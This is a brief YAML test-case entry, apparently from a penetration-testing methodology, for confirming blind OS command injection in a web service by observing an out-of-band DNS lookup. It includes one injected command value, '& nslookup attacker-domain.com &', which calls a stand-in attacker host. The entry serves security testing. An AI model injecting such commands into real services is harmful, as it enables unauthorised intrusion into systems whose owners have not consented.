---
testcase: Verify that injecting outbound network commands (e.g., & nslookup attacker-domain.com &) into a Web (HTTP/HTTPS) service results in a DNS request observed on an external monitoring system
platforms: 
  - Web
  - Network
methodology: 
  - BlackBox
  - GreyBox
owasp-catgeory:
  - 
vulnerabilities:
  - Command_injection
services:
  - WEB
references:
  - https://portswigger.net/web-security/os-command-injection
---